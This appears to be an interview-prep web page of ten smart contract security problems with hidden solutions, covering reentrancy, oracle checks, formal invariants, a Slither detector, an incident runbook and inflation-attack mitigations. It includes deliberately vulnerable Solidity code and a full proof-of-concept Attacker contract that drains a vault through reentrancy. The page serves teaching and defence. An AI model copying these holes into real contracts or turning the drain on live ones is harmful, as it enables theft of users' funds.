@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Coding Problems — Smart Contract Security Engineer</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+<link rel="stylesheet" href="../../assets/style.css">
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js"></script>
+<script defer src="../../assets/script.js"></script>
+</head>
+<body>
+
+<div class="layout">
+
+<aside class="sidebar" id="sidebar">
+  <button class="mobile-toc-toggle">☰ Contents</button>
+  <nav>
+    <h2>Sections</h2>
+    <a href="#how">How to use this chapter</a>
+    <a href="#p1">P1 · Spot the bug — withdraw</a>
+    <a href="#p2">P2 · CVL invariant: no bad debt</a>
+    <a href="#p3">P3 · Foundry invariant: AMM solvency</a>
+    <a href="#p4">P4 · Slither custom detector</a>
+    <a href="#p5">P5 · Design a fix</a>
+    <a href="#p6">P6 · Write a PoC exploit</a>
+    <a href="#p7">P7 · Spot the bug — oracle</a>
+    <a href="#p8">P8 · War-room runbook</a>
+    <a href="#p9">P9 · CVL parametric access control</a>
+    <a href="#p10">P10 · Donation attack mitigation</a>
+
+    <h2>Navigation</h2>
+    <a href="index.html">↺ All guides</a>
+    <a href="10-coding-fundamentals.html">← Previous</a>
+    <a href="12-data-pipelines.html">Next →</a>
+  </nav>
+</aside>
+
+<main>
+
+<header class="hero">
+  <span class="eyebrow">Section C · Coding</span>
+  <h1>Coding Problems</h1>
+  <p class="subtitle">Ten security-flavored problems. Each has a hidden solution — try yours first, then expand. Most should be doable in 15-30 minutes on paper.</p>
+</header>
+
+<section id="how">
+  <h2>How to use this chapter</h2>
+  <p>Each problem includes a setup and a hidden solution. For drill mode: cover the answer, work through it on paper or in a sandbox repo, then reveal. The point isn't the answer — it's the reasoning chain.</p>
+  <div class="callout tip">
+    <span class="callout-label">In the loop</span>
+    <p>Talk while you work. Interviewers score the reasoning over the bug-find. "I'd check reentrancy first because there's an external call, then access control because the function isn't owner-gated, then math..." is a better answer than silent staring followed by the right bug.</p>
+  </div>
+</section>
+
+<section id="p1">
+  <h2>P1 · Spot the bug — withdraw</h2>
+  <p>Below is a vault withdraw function. Find the bug(s) and propose a fix.</p>
+  <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">contract Vault {
+    mapping(address =&gt; uint256) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint256 amount) external {
+        require(balances[msg.sender] &gt;= amount, "INSUFFICIENT");
+        (bool ok,) = msg.sender.call{value: amount}("");
+        require(ok, "TRANSFER_FAIL");
+        balances[msg.sender] -= amount;
+    }
+}</code></pre></div>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <p>Classic reentrancy. The external call happens before the balance update, so a malicious recipient can re-enter <code>withdraw</code> and drain. Fix: apply CEI — update state before the external call — and/or add <code>nonReentrant</code>.</p>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">function withdraw(uint256 amount) external nonReentrant {
+    require(balances[msg.sender] &gt;= amount, "INSUFFICIENT");
+    balances[msg.sender] -= amount;                     // effect first
+    (bool ok,) = msg.sender.call{value: amount}("");    // interaction last
+    require(ok, "TRANSFER_FAIL");
+}</code></pre></div>
+  </details>
+</section>
+
+<section id="p2">
+  <h2>P2 · Write the CVL invariant: no bad debt</h2>
+  <p>For a lending market with <code>totalSupplyAssets()</code>, <code>totalBorrowAssets()</code>, <code>totalSupplyShares()</code>, <code>totalBorrowShares()</code> — write a CVL invariant that captures "the protocol always has enough underlying to cover all borrowers."</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-text">invariant noBadDebt()
+    totalBorrowAssets() &lt;= totalSupplyAssets()
+{
+    preserved with (env e) {
+        // Required: time hasn't advanced absurdly (rate accrual sane)
+        require e.block.timestamp &lt; 2^40;
+    }
+}</code></pre></div>
+    <p>Note: this invariant might fail on an instant after accrual if you haven't bounded the interest rate. In practice you'd also add a rate-monotonic assumption and possibly summarize the rate function.</p>
+  </details>
+</section>
+
+<section id="p3">
+  <h2>P3 · Foundry invariant test: AMM solvency</h2>
+  <p>For a constant-product AMM with reserves <code>r0</code>, <code>r1</code> and LP token <code>shares</code>: write an invariant test asserting the AMM is always solvent (reserves cover all redeemable claims).</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">contract AMMInvariants is Test {
+    AMM amm;
+    Handler handler;
+
+    function setUp() public {
+        amm = new AMM();
+        handler = new Handler(amm);
+        targetContract(address(handler));
+    }
+
+    function invariant_KIncreases() public {
+        // K = r0 * r1 only grows (or stays equal) after fee-bearing swaps
+        assertGe(amm.r0() * amm.r1(), handler.ghostInitialK());
+    }
+
+    function invariant_TotalSharesGtZero() public {
+        assertGt(amm.totalShares(), 0);
+    }
+
+    function invariant_ReservesMatchBalances() public {
+        assertEq(amm.r0(), token0.balanceOf(address(amm)));
+        assertEq(amm.r1(), token1.balanceOf(address(amm)));
+    }
+}</code></pre></div>
+    <p>Hint about the third invariant: if you fail this one in production, you've found a donation-style accounting bug.</p>
+  </details>
+</section>
+
+<section id="p4">
+  <h2>P4 · Write a Slither custom detector</h2>
+  <p>Outline a Slither detector that flags any external state-modifying function lacking a <code>nonReentrant</code> modifier when the function makes an external call.</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <p>Outline (Python):</p>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-text">from slither.detectors.abstract_detector import AbstractDetector, DetectorClassification
+
+class MissingReentrancyGuard(AbstractDetector):
+    ARGUMENT = "missing-nonreentrant"
+    HELP = "External fns with external call lacking nonReentrant"
+    IMPACT = DetectorClassification.MEDIUM
+    CONFIDENCE = DetectorClassification.MEDIUM
+
+    def _detect(self):
+        results = []
+        for contract in self.compilation_unit.contracts_derived:
+            for fn in contract.functions:
+                if not fn.is_external_or_public(): continue
+                if fn.view or fn.pure: continue
+                if not any(call.is_external for call in fn.all_external_calls()): continue
+                if any(m.name == "nonReentrant" for m in fn.modifiers): continue
+                results.append(self.generate_result([fn, " missing nonReentrant\n"]))
+        return results</code></pre></div>
+    <p>Real implementation needs to handle interface calls vs library calls, OpenZeppelin's check, etc.</p>
+  </details>
+</section>
+
+<section id="p5">
+  <h2>P5 · Design a fix</h2>
+  <p>Given the vault from P1, you can't add <code>nonReentrant</code> because the codebase pre-dates OpenZeppelin and doesn't have one. Design two alternative fixes — one with no library, one using transient storage (post-Cancun).</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <p>Option 1 — inline lock using storage:</p>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">uint256 private _locked = 1;
+modifier lock() {
+    require(_locked == 1, "REENTRY");
+    _locked = 2;
+    _;
+    _locked = 1;
+}</code></pre></div>
+    <p>Option 2 — transient storage (EIP-1153):</p>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">bytes32 constant LOCK_SLOT = keccak256("vault.reentrancy.lock");
+modifier lock() {
+    assembly {
+        if tload(LOCK_SLOT) { mstore(0, 0x52454e545259) revert(0, 32) }
+        tstore(LOCK_SLOT, 1)
+    }
+    _;
+    assembly { tstore(LOCK_SLOT, 0) }
+}</code></pre></div>
+    <p>Option 2 saves the SSTORE/SLOAD cost (~5000 gas per protected call). Option 1 works on chains pre-Cancun.</p>
+  </details>
+</section>
+
+<section id="p6">
+  <h2>P6 · Write a PoC exploit (education only)</h2>
+  <p>Given the vault from P1, write a Foundry test that exploits the bug. The PoC should demonstrate a complete drain.</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">contract Attacker {
+    Vault public vault;
+    uint256 public stolen;
+
+    constructor(Vault _vault) { vault = _vault; }
+
+    function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(vault).balance &gt;= msg.value) {
+            vault.withdraw(msg.value);
+        } else {
+            stolen = address(this).balance;
+        }
+    }
+}
+
+contract VaultExploitTest is Test {
+    function testDrain() public {
+        Vault v = new Vault();
+        // Victim deposits
+        vm.deal(address(0xBEEF), 10 ether);
+        vm.prank(address(0xBEEF));
+        v.deposit{value: 10 ether}();
+
+        // Attacker deposits 1 ETH and drains the rest
+        Attacker a = new Attacker(v);
+        vm.deal(address(this), 1 ether);
+        a.attack{value: 1 ether}();
+
+        assertEq(address(v).balance, 0);
+        assertGt(a.stolen(), 10 ether);
+    }
+}</code></pre></div>
+    <p>This is an education-only PoC. In real bounty triage, PoCs run against a local fork, never against live mainnet contracts.</p>
+  </details>
+</section>
+
+<section id="p7">
+  <h2>P7 · Spot the bug — oracle read</h2>
+  <p>Find the bug.</p>
+  <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">function getCollateralValue(address user) public view returns (uint256) {
+    uint256 collateral = collateralOf[user];
+    (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
+    return collateral * uint256(price) / 1e8;
+}</code></pre></div>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <p>Multiple bugs:</p>
+    <ol>
+      <li><strong>No staleness check.</strong> <code>updatedAt</code> is read but never compared to <code>block.timestamp</code>. A stale price will be used as fresh.</li>
+      <li><strong>No negative-price check.</strong> Chainlink can return 0 or negative on certain failure modes; <code>uint256(price)</code> on a negative value wraps to a huge number.</li>
+      <li><strong>No round-completeness check.</strong> The first return value (<code>roundId</code>) and <code>answeredInRound</code> aren't checked; round may not have completed.</li>
+    </ol>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-solidity">function getCollateralValue(address user) public view returns (uint256) {
+    uint256 collateral = collateralOf[user];
+    (uint80 roundId, int256 price, , uint256 updatedAt, uint80 answeredInRound) = chainlinkFeed.latestRoundData();
+    require(price &gt; 0, "INVALID_PRICE");
+    require(updatedAt != 0 &amp;&amp; block.timestamp - updatedAt &lt;= MAX_STALENESS, "STALE");
+    require(answeredInRound &gt;= roundId, "INCOMPLETE_ROUND");
+    return collateral * uint256(price) / 1e8;
+}</code></pre></div>
+  </details>
+</section>
+
+<section id="p8">
+  <h2>P8 · Write a war-room runbook</h2>
+  <p>You wake up to an alert: <em>unusual outflow detected, 3% of TVL drained in the last 30 minutes</em>. Outline the runbook for the first 4 hours.</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <ol>
+      <li><strong>0-10 min</strong>: Acknowledge alert. Open war-room channel. Page secondary on-call.</li>
+      <li><strong>10-30 min</strong>: Validate the alert. Pull recent transactions. Identify the address(es) involved. Is this withdrawal or transfer? Is it a single actor or many?</li>
+      <li><strong>30-60 min</strong>: Determine if it's an exploit (vs e.g., a single whale exit). If suspicious: invoke pause if available; alert multi-sig.</li>
+      <li><strong>1-2 hours</strong>: Trace root cause. Did a contract get called in a novel way? Was there an oracle deviation? Look at correlated events.</li>
+      <li><strong>2-3 hours</strong>: If exploit confirmed: white-hat rescue if possible (drain remaining funds to a safe contract). Contact incident-response community (Seal 911, Security Alliance). Notify exchanges to freeze inbound deposits from the attacker address.</li>
+      <li><strong>3-4 hours</strong>: Initial public statement ("we are investigating an incident, please refrain from interacting with X contracts"). Begin patch.</li>
+    </ol>
+    <p>Comms discipline throughout: one designated voice, no speculation, acknowledge fast but commit slowly.</p>
+  </details>
+</section>
+
+<section id="p9">
+  <h2>P9 · CVL parametric access control</h2>
+  <p>Write a CVL parametric rule asserting that only the owner can change protocol parameters.</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <div class="code-wrap"><button class="copy-btn">Copy</button><pre><code class="language-text">// Track if any parameter changed
+ghost bool paramChanged {
+    init_state axiom paramChanged == false;
+}
+
+hook Sstore _interestRate uint256 newVal (uint256 oldVal) STORAGE {
+    if (newVal != oldVal) paramChanged = true;
+}
+hook Sstore _ltv uint256 newVal (uint256 oldVal) STORAGE {
+    if (newVal != oldVal) paramChanged = true;
+}
+
+rule onlyOwnerChangesParams(method f, env e, calldataarg args) {
+    require !paramChanged;
+    f(e, args);
+    assert paramChanged =&gt; e.msg.sender == owner();
+}</code></pre></div>
+    <p>The parametric rule explodes over every method, so a single rule covers the whole external surface.</p>
+  </details>
+</section>
+
+<section id="p10">
+  <h2>P10 · Donation attack mitigation</h2>
+  <p>Given an empty ERC-4626 vault, describe four distinct mitigations to the first-depositor inflation attack and rank them by side-effects.</p>
+  <details class="reveal">
+    <summary>Reveal solution</summary>
+    <ol>
+      <li><strong>Decimal offset (OpenZeppelin default)</strong> — virtual shares with a decimal offset (e.g., 10^6). Inflation becomes economically unprofitable. <em>Best default.</em> Side-effects: small precision tax on legitimate users.</li>
+      <li><strong>Dead shares</strong> — first deposit mints e.g. 1000 wei of shares to address(0). Side-effects: first depositor loses the dead-shares amount. Simple.</li>
+      <li><strong>Minimum first deposit</strong> — require first deposit ≥ MIN_INITIAL (e.g., 100 token units). Side-effects: UX friction; doesn't help if attacker is willing to spend MIN_INITIAL.</li>
+      <li><strong>Track deposits internally</strong> — vault stores a <code>storedAssets</code> variable updated only on deposit/withdraw; donations don't affect accounting. Side-effects: more code; donated assets become unrecoverable.</li>
+    </ol>
+    <p>In an interview, naming OpenZeppelin ERC4626's default and explaining why it's the default signals depth.</p>
+  </details>
+</section>
+
+<footer>
+  <p><a href="10-coding-fundamentals.html">← Coding Fundamentals</a> · <a href="12-data-pipelines.html">Next: Data &amp; Pipelines →</a> · <a href="index.html">All guides</a></p>
+</footer>
+
+</main>
+</div>
+
+<button class="theme-toggle" id="themeToggle" title="Toggle theme">🌙</button>
+
+</body>
+</html>
